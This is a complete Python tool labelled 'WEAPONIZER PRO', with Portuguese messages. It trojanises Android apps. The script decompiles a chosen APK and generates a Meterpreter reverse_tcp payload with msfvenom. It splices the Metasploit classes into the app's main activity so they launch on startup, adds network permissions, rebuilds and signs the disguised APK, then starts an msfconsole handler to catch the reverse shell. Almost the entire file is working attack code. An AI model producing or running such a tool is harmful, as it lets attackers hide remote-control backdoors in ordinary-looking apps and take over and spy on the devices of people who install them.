#!/usr/bin/env python3
import subprocess
import re
import os
import sys
import time
from shutil import which, copytree, rmtree

# --- PALETA DE CORES ---
RED, DARK_RED, WHITE, BOLD, RESET, YELLOW, GREEN = "\33[91m", "\33[31m", "\33[97m", "\33[1m", "\33[0m", "\33[93m", "\33[92m"

def log(msg, level="info"):
    p = {"info": f"{WHITE}[*]{RESET}", "success": f"{GREEN}[+]{RESET}", "warn": f"{YELLOW}[!]{RESET}", "error": f"{BOLD}{RED}[-]{RESET}"}
    print(f"{p.get(level, '[*]')} {msg}")

def exibir_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = fr"""
{RED} ██╗    ██╗███████╗ █████╗ ██████╗  ██████╗ ███╗   ██╗██╗███████╗███████╗██████╗ 
{RED} ██║    ██║██╔════╝██╔══██╗██╔══██╗██╔═══██╗████╗  ██║██║╚══███╔╝██╔════╝██╔══██╗
{DARK_RED} ██║ █╗ ██║█████╗  ███████║██████╔╝██║   ██║██╔██╗ ██║██║  ███╔╝ █████╗  ██████╔╝
{DARK_RED} ██║███╗██║██╔══╝  ██╔══██║██╔═══╝ ██║   ██║██║╚██╗██║██║ ███╔╝  ██╔══╝  ██╔══██╗
{RED} ╚███╔███╔╝███████╗██║  ██║██║     ╚██████╔╝██║ ╚████║██║███████╗███████╗██║  ██║
{RED}  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
{RESET}
 {WHITE}{BOLD}WEAPONIZER PRO{RESET} | {WHITE}Build + Sign + Listen (Red Edition){RESET}
 {DARK_RED}─────────────────────────────────────────────────────────────────────────────{RESET}
    """.strip()
    print(banner)

def fix_permissions(project_folder):
    """Injeta permissões de rede no AndroidManifest.xml."""
    manifest = os.path.join(project_folder, "AndroidManifest.xml")
    if not os.path.exists(manifest): return
    with open(manifest, "r") as f: content = f.read()
    perms = ['android.permission.INTERNET', 'android.permission.ACCESS_NETWORK_STATE', 'android.permission.WAKE_LOCK']
    needed = [f'    <uses-permission android:name="{p}"/>' for p in perms if p not in content]
    if needed:
        new_content = content.replace("</manifest>", "\n".join(needed) + "\n</manifest>")
        with open(manifest, "w") as f: f.write(new_content)
        log("Permissões injetadas no Manifesto.", "success")

def iniciar_listener(ip, porta):
    """Cria script RC e dispara o Handler."""
    rc_content = f"use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST {ip}\nset LPORT {porta}\nset EXITONSESSION false\nexploit -j"
    with open("handler.rc", "w") as f: f.write(rc_content)
    log("Iniciando msfconsole...", "warn")
    os.system(f"msfconsole -q -r handler.rc")

def gerar_e_injetar_payload(project_folder):
    lhost = input(f" {YELLOW}»{RESET} LHOST (IP/DNS): ").strip()
    lport = input(f" {YELLOW}»{RESET} LPORT: ").strip()
    if not lhost or not lport: return False, None, None

    log(f"Gerando Payload Meterpreter...", "info")
    subprocess.run(["msfvenom", "-p", "android/meterpreter/reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}", "-o", "p.apk"], capture_output=True)
    subprocess.run(["apktool", "d", "p.apk", "-o", "p_tmp", "-f"], capture_output=True)
    
    # Migração das classes do Metasploit
    src = os.path.join("p_tmp", "smali", "com", "metasploit")
    dst = os.path.join(project_folder, "smali", "com", "metasploit")
    if os.path.exists(dst): rmtree(dst)
    copytree(src, dst)

    # Identificar MainActivity
    with open(os.path.join(project_folder, "AndroidManifest.xml"), "r") as f:
        m = f.read()
        main_activity = re.search(r'<activity [^>]*android:name="([^"]+)"', m).group(1)
        if main_activity.startswith('.'):
            pkg = re.search(r'package="([^"]+)"', m).group(1)
            main_activity = pkg + main_activity

    # BUSCA CORRIGIDA DO ARQUIVO SMALI
    rel_path = main_activity.replace('.', '/') + ".smali"
    smali_path = None
    # Procura em smali, smali_classes2, smali_classes3...
    for i in range(1, 15):
        folder = "smali" if i == 1 else f"smali_classes{i}"
        test_path = os.path.join(project_folder, folder, rel_path)
        if os.path.exists(test_path):
            smali_path = test_path
            break

    if smali_path:
        log(f"Injetando em: {os.path.basename(smali_path)}", "success")
        with open(smali_path, "r") as f: lines = f.readlines()
        
        new_lines, injected, in_oncreate = [], False, False
        for line in lines:
            new_lines.append(line)
            if ".method" in line and "onCreate(Landroid/os/Bundle;)V" in line: in_oncreate = True
            if in_oncreate and "invoke-super" in line and not injected:
                new_lines.append("\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V\n")
                injected = True
            if ".end method" in line: in_oncreate = False
            
        with open(smali_path, "w") as f: f.writelines(new_lines)
        fix_permissions(project_folder)
        if os.path.exists("p_tmp"): rmtree("p_tmp")
        if os.path.exists("p.apk"): os.remove("p.apk")
        return True, lhost, lport
    
    log("Erro: Não foi possível localizar o arquivo Smali da MainActivity.", "error")
    return False, None, None

def build_e_assinar(out):
    final = os.path.abspath(f"{out}_weaponized.apk")
    log(f"Recompilando '{out}'...", "info")
    subprocess.run(["apktool", "b", out, "-o", "t.apk"], capture_output=True)
    
    if not os.path.exists("debug.keystore"):
        subprocess.run(["keytool", "-genkey", "-v", "-keystore", "debug.keystore", "-alias", "dev", "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000", "-storepass", "android", "-keypass", "android", "-dname", "CN=W"], capture_output=True)
    
    log("Assinando APK...", "info")
    subprocess.run(["apksigner", "sign", "--ks", "debug.keystore", "--ks-pass", "pass:android", "--out", final, "t.apk"])
    if os.path.exists("t.apk"): os.remove("t.apk")
    print(f"\n{GREEN}[+] SUCESSO! APK Gerado:{RESET} {BOLD}{final}{RESET}")
    return True

def main():
    while True:
        exibir_banner()
        print(f" [{RED}1{RESET}] Decompile\n [{RED}2{RESET}] INJETAR SHELL + BUILD + SIGN\n [{RED}3{RESET}] ls\n [{RED}4{RESET}] Sair")
        cmd = input(f"\n {BOLD}{RED}WEAPONIZER@pentest:~# {RESET}").strip()
        
        if cmd == "3" or cmd.lower() == "ls":
            subprocess.run(["ls", "-F", "--color=auto"]); input("\nEnter...")
        elif cmd == "1":
            file = input(f" {RED}»{RESET} APK: ").strip()
            if os.path.exists(file):
                out = os.path.splitext(os.path.basename(file))[0]
                subprocess.run(["apktool", "d", file, "-o", out, "-f"])
                log(f"Projeto extraído em: {out}", "success"); time.sleep(2)
            else: log("Arquivo não encontrado.", "error"); time.sleep(1)
        elif cmd == "2":
            out = input(f" {RED}»{RESET} Pasta do projeto: ").strip().rstrip('/')
            if os.path.isdir(out):
                success, ip, port = gerar_e_injetar_payload(out)
                if success and build_e_assinar(out):
                    if input(f"\n{YELLOW}[?]{RESET} Iniciar Handler? (s/n): ").lower() == 's': iniciar_listener(ip, port)
            else: log("Pasta inválida.", "error"); time.sleep(1)
        elif cmd == "4" or cmd.lower() == "exit": break

if __name__ == "__main__":
    main()
